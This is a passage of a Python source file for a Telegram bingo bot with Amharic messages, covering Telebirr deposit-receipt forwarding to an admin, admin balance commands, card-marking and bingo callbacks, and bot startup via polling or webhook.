        f"2. ገንዘቡን ወደ ላይ በተጠቀሰው ቁጥር ይላኩ። የሚላከው ዝቅተኛ መጠን {MIN_DEPOSIT:.2f} ብር ነው።\n\n"
        f"🚨 ቀጣይ እርምጃ 🚨\n"
        f"ገንዘቡን ከላኩ በኋላ፣ እባክዎ ከታች ያለውን ቁልፍ በመጫን **የላኩበትን ደረሰኝ (ፎቶ፣ ሰነድ ወይም የማረጋገጫ ጽሑፍ)** ይላኩልኝ።\n\n"
        f"ሰርዝ: ሂደቱን ለማቋረጥ /cancel ይጠቀሙ።"
    )
    
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    return GET_DEPOSIT_CONFIRMATION

async def start_deposit_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Handles the callback after the user presses the 'I have deposited' button.
    It tells the user to send the receipt.
    """
    query = update.callback_query
    await query.answer()
    
    await query.message.reply_text("📷 እባክዎ የቴሌብር ደረሰኝ ፎቶ፣ ሰነድ ወይም የማረጋገጫ መልእክት አሁን ይላኩ።")
    return GET_DEPOSIT_CONFIRMATION


async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Handles the user's receipt (photo/document/text) and notifies the admin. 
    IMPROVEMENT: Forwards the receipt and user ID to the admin.
    """
    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name
    
    if not ADMIN_USER_ID:
        await update.message.reply_text("❌ የአስተዳዳሪ ID አልተዋቀረም፣ የማረጋገጫ ሂደቱ ሊጠናቀቅ አይችልም። እባክዎ ቆይተው ይሞክሩ።")
        return ConversationHandler.END
    
    admin_notification_base = (
        f"🚨 አዲስ የተቀማጭ ገንዘብ ጥያቄ (Deposit Request) 🚨\n\n"
        f"👤 የተጠቃሚ ስም: @{username}\n"
        f"ID: `{user_id}`\n\n"
    )
    
    # Check for the different types of receipts (Photo, Document, or Text)
    if update.message.photo or update.message.document or update.message.text:
        caption_suffix = f"እርምጃ: ሒሳብዎን አረጋግጠው በሚከተለው ትዕዛዝ ገንዘቡን ይጨምሩ:\n`/ap_dep {user_id} [መጠን]`"

        if update.message.photo:
            caption = admin_notification_base + "✅ የተላከ ደረሰኝ: ፎቶ\n" + caption_suffix
            # Get the file_id of the largest photo size
            photo_file_id = update.message.photo[-1].file_id 
            try:
                # Send the photo to the admin
                await context.bot.send_photo(ADMIN_USER_ID, photo_file_id, caption=caption, parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Failed to send photo receipt to admin: {e}")
            
        elif update.message.document:
            caption = admin_notification_base + "✅ የተላከ ደረሰኝ: ሰነድ/ፋይል\n" + caption_suffix
            document_file_id = update.message.document.file_id
            try:
                # Send the document to the admin
                await context.bot.send_document(ADMIN_USER_ID, document_file_id, caption=caption, parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Failed to send document receipt to admin: {e}")

        elif update.message.text:
            confirmation_text = update.message.text
            admin_notification = admin_notification_base + (
                f"📬 የማረጋገጫ መልእክት:\n`{confirmation_text}`\n\n" + caption_suffix
            )
            try:
                # Send the text message to the admin
                await context.bot.send_message(ADMIN_USER_ID, admin_notification, parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Failed to send text confirmation to admin: {e}")
                
        # Send confirmation to user
        user_confirmation = (
            "✅ የማረጋገጫ መልእክት/ደረሰኝዎ ተልኳል!\n\n"
            "አስተዳዳሪው ደረሰኝዎን እየተመለከተ ነው። በቅርቡ ሒሳብዎ ላይ ገቢ ይደረጋል።\n\n"
            "ሒሳብዎን ለመፈተሽ: /balance"
        )
        await update.message.reply_text(user_confirmation, parse_mode='Markdown')
        return ConversationHandler.END
            
    else:
        # User sent something that is neither photo, document, nor valid text.
        await update.message.reply_text("❌ እባክዎ የቴሌብር ደረሰኝ ፎቶ፣ ሰነድ ወይም የማረጋገጫ መልእክት ብቻ ይላኩ።")
        return GET_DEPOSIT_CONFIRMATION

async def cancel_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the current conversation for deposit."""
    await update.message.reply_text("ገንዘብ የማስገባት ሂደቱ ተሰርዟል።")
    return ConversationHandler.END


# --- ADMIN HANDLERS (Unchanged from previous context) ---

async def check_admin(user_id: int) -> bool:
    """Simple check if the user is the admin."""
    return user_id == ADMIN_USER_ID

async def ap_dep(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: Adds money to a user's balance. Usage: /ap_dep [user_id] [amount]"""
    if not await check_admin(update.effective_user.id):
        await update.message.reply_text("❌ ይህ ትዕዛዝ ለአስተዳዳሪዎች ብቻ ነው።")
        return
        
    try:
        parts = context.args
        if len(parts) != 2:
            await update.message.reply_text("❌ አጠቃቀም: /ap_dep [user_id] [amount]")
            return
            
        target_user_id = int(parts[0])
        amount = float(parts[1])
        
        update_balance(target_user_id, amount, 'Admin Deposit', f"Admin added {amount:.2f} Birr")
        
        # Notify both admin and user
        await update.message.reply_text(f"✅ ለተጠቃሚ ID {target_user_id} ሒሳብ {amount:.2f} ብር ገቢ ተደርጓል።")
        try:
            target_user_data = await get_user_data(target_user_id)
            await context.bot.send_message(
                target_user_id, 
                f"🎉 **{amount:.2f} ብር** ወደ ሒሳብዎ ገቢ ተደርጓል። የአሁኑ ሒሳብዎ: **{target_user_data['balance']:.2f} ብር**", 
                parse_mode='Markdown'
            )
        except Exception:
             logger.warning(f"Could not notify user {target_user_id} about admin deposit.")

    except ValueError:
        await update.message.reply_text("❌ የተጠቃሚ ID እና መጠን ቁጥር መሆን አለባቸው።")
    except Exception as e:
        await update.message.reply_text(f"❌ ስህተት ተፈጠረ: {e}")

async def ap_bal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: Manually sets a user's balance. Usage: /ap_bal [user_id] [amount]"""
    if not await check_admin(update.effective_user.id):
        await update.message.reply_text("❌ ይህ ትዕዛዝ ለአስተዳዳሪዎች ብቻ ነው።")
        return
        
    try:
        parts = context.args
        if len(parts) != 2:
            await update.message.reply_text("❌ አጠቃቀም: /ap_bal [user_id] [amount]")
            return
            
        target_user_id = int(parts[0])
        new_balance = float(parts[1])
        
        # Calculate the difference to log a proper transaction
        current_data = await get_user_data(target_user_id)
        current_balance = current_data['balance']
        adjustment_amount = new_balance - current_balance
        
        # Use update_balance to ensure transaction history is logged
        update_balance(target_user_id, adjustment_amount, 'Admin Set Balance', f"Admin set balance to {new_balance:.2f} Birr")
        
        await update.message.reply_text(f"✅ የተጠቃሚ ID {target_user_id} ሒሳብ ወደ {new_balance:.2f} ብር ተስተካክሏል።")
        try:
            await context.bot.send_message(
                target_user_id, 
                f"⚠️ ሒሳብዎ በአስተዳዳሪ ወደ **{new_balance:.2f} ብር** ተስተካክሏል።", 
                parse_mode='Markdown'
            )
        except Exception:
             logger.warning(f"Could not notify user {target_user_id} about admin balance set.")

    except ValueError:
        await update.message.reply_text("❌ የተጠቃሚ ID እና መጠን ቁጥር መሆን አለባቸው።")
    except Exception as e:
        await update.message.reply_text(f"❌ ስህተት ተፈጠረ: {e}")

async def ap_bal_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: Checks a user's current balance. Usage: /ap_bal_check [user_id]"""
    if not await check_admin(update.effective_user.id):
        await update.message.reply_text("❌ ይህ ትዕዛዝ ለአስተዳዳሪዎች ብቻ ነው።")
        return
        
    try:
        parts = context.args
        if len(parts) != 1:
            await update.message.reply_text("❌ አጠቃቀም: /ap_bal_check [user_id]")
            return
            
        target_user_id = int(parts[0])
        target_user_data = await get_user_data(target_user_id)
        
        await update.message.reply_text(
            f"👤 የተጠቃሚ ID {target_user_id} ሒሳብ: **{target_user_data['balance']:.2f} ብር**",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ የተጠቃሚ ID ቁጥር መሆን አለበት።")
    except Exception as e:
        await update.message.reply_text(f"❌ ስህተት ተፈጠረ: {e}")


# --- CALLBACK QUERY HANDLER (for Mark/Bingo buttons) ---

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles button presses from the Bingo card."""
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('|')
    action = data[0]
    game_id = data[1]
    message_id = int(data[2])
    user_id = query.from_user.id
    
    game = ACTIVE_GAMES.get(game_id)
    if not game:
        await query.edit_message_text("❌ ጨዋታው አብቅቷል ወይም ተሰርዟል።")
        return
        
    card = game['player_cards'].get(user_id)
    if not card:
        await query.edit_message_text("❌ ለዚህ ጨዋታ የተመዘገበ ካርድ የለዎትም።")
        return

    # 1. Handle MARK action
    if action == "MARK":
        card_num = int(data[3])
        col = int(data[4])
        row = int(data[5])
        pos = (col, row)
        
        # Check if the number has actually been called
        if not card['called'].get(pos, False):
            await query.answer("❌ ይህ ቁጥር ገና አልተጠራም!", show_alert=True)
            return
            
        # Check if already marked
        if card['marked'].get(pos, False):
            await query.answer("⚠️ አስቀድመው ምልክት አድርገውበታል!", show_alert=True)
            return

        # Mark the square
        card['marked'][pos] = True
        
        # Update the card message immediately
        kb = build_card_keyboard(card, game_id, message_id)
        
        # Update message text (keeping the latest called number visible)
        called_numbers = game.get('called_numbers', [])
        last_call_text = get_bingo_call(called_numbers[-1]) if called_numbers else "..."
        
        card_msg_text = (
            f"**ካርድ ቁጥር #{card['number']}**\n"
            f"🔥 **አሁን የተጠራው ቁጥር: {last_call_text}** 🔥\n\n" 
            f"🟢 ቁጥር ሲጠራ 'Mark' ቁልፉን ይጫኑ።\n"
            f"✅ 5 አግድም፣ ቁመታዊ ወይም ሰያፍ መስመር ሲሞላ '🚨 BINGO 🚨' ይጫኑ።"
        )
        
        try:
            await query.edit_message_text(
                text=card_msg_text,
                reply_markup=kb,
                parse_mode='Markdown'
            )
        except Exception as e:
            # Ignore "Message is not modified" errors
            if "message is not modified" not in str(e):
                logger.error(f"Failed to edit card after marking: {e}")

    # 2. Handle BINGO action
    elif action == "BINGO":
        if check_win(card):
            # Win is confirmed. Stop the game loop and finalize.
            # Use asyncio.create_task to run finalize_win without blocking the handler
            asyncio.create_task(finalize_win(context, game_id, user_id, is_bot_win=False))
            # Temporary message until finalize_win updates it
            await query.edit_message_text("🎉 ቢንጎ! ማሸነፍዎ እየተረጋገጠ ነው። እባክዎ ይጠብቁ።")
        else:
            await query.answer("❌ ገና ቢንጎ አልሞሉ! በትክክል ይሙሉ።", show_alert=True)
            
            
# --- 6. Main Function ---

def main():
    """Starts the bot. (Amharic: ቦቱን ይጀምራል)"""
    if not TOKEN or TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        logger.error("FATAL: TELEGRAM_TOKEN environment variable not set or default value used.")
        return

    # Set up application
    app = Application.builder().token(TOKEN).build()
    
    # --- 1. Conversation Handlers ---
    
    # A. PLAY Command Conversation Handler (Uses single entry point)
    play_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("play", play_command)],
        states={
            GET_CARD_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card_selection)],
        },
        fallbacks=[CommandHandler('cancel', cancel_play)],
    )
    app.add_handler(play_conv_handler)

    # B. WITHDRAW Conversation Handler
    withdraw_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("withdraw", withdraw_command)], 
        states={
            GET_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_withdraw_amount)],
            GET_TELEBIRR_ACCOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_telebirr_account)],
        },
        fallbacks=[CommandHandler('cancel', cancel_withdraw)],
    )
    app.add_handler(withdraw_conv_handler)
    
    # C. DEPOSIT Conversation Handler (IMPROVED to handle all media types for receipts)
    deposit_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("deposit", deposit_command_initial)],
        states={
            # Filters.ALL catches photos, documents, and text messages for the receipt.
            GET_DEPOSIT_CONFIRMATION: [MessageHandler(filters.ALL & ~filters.COMMAND, handle_deposit_confirmation)],
        },
        fallbacks=[CommandHandler('cancel', cancel_deposit)],
        # Allow re-entry if the user tries /deposit again while in the flow
        allow_reentry=True 
    )
    app.add_handler(deposit_conv_handler)
    
    # --- 2. Simple Command Handlers ---
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("quickplay", quickplay_command)) 
    app.add_handler(CommandHandler("balance", balance_command)) 
    app.add_handler(CommandHandler("refer", refer_command))
    
    app.add_handler(CommandHandler("stats", stats_command)) 
    app.add_handler(CommandHandler("rank", rank_command))  
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("rules", rules_command)) 
    
    # Admin commands
    app.add_handler(CommandHandler("ap_dep", ap_dep)) 
    app.add_handler(CommandHandler("ap_bal", ap_bal)) 
    app.add_handler(CommandHandler("ap_bal_check", ap_bal_check)) 

    # --- 3. Callback Query Handler (for button interactions) ---
    app.add_handler(CallbackQueryHandler(handle_callback, pattern='^(MARK|BINGO)'))
    # Handle the inline button press to proceed to receipt upload
    app.add_handler(CallbackQueryHandler(start_deposit_conversation, pattern='^START_DEPOSIT_FLOW$'))


    # --- 4. Start the Bot (Polling or Webhook) ---
    PORT = int(os.environ.get('PORT', '8080'))
    if RENDER_EXTERNAL_URL:
        logger.info(f"Running via webhook at {RENDER_EXTERNAL_URL}/{TOKEN}")
        app.run_webhook(listen="0.0.0.0", port=PORT, url_path=TOKEN, webhook_url=f'{RENDER_EXTERNAL_URL}/{TOKEN}')
    else:
        logger.info("Running via long polling.")
        app.run_polling(poll_interval=1.0)

if __name__ == '__main__':
    main()
